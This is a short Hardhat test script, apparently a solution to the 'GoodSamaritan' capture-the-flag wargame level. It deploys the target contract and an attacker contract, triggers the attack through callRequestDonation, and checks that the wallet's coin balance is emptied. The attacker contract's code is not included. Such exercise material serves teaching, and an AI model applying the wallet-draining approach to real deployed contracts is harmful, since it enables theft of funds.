import { expect } from "chai";
import { ethers } from "hardhat";

describe("GoodSamaritan", async function () {

  it("Should empty the GoodSamaritan wallet", async function () {
    //setup+
    const [deployer, attacker] = await ethers.getSigners()

    const GoodSamaritan = await ethers.getContractFactory("GoodSamaritan");
    const goodSamaritan = await GoodSamaritan.deploy();
    await goodSamaritan.deployed();
    const walletAddr = await goodSamaritan.wallet();
    const coinAddr = await goodSamaritan.coin();

    const coin = await ethers.getContractAt('Coin', coinAddr)
    //setup+

    //1.Deploy Attacker
    const GoodSamaritanAttacker = await ethers.getContractFactory("GoodSamaritanAttacker");
    const goodSamaritanAttacker = await GoodSamaritanAttacker.connect(attacker).deploy(goodSamaritan.address);
    await goodSamaritanAttacker.deployed();

    //2.Call Attacker
    await goodSamaritanAttacker.connect(attacker).callRequestDonation()

    expect(await coin.balances(walletAddr)).to.eq(0)
  });
});
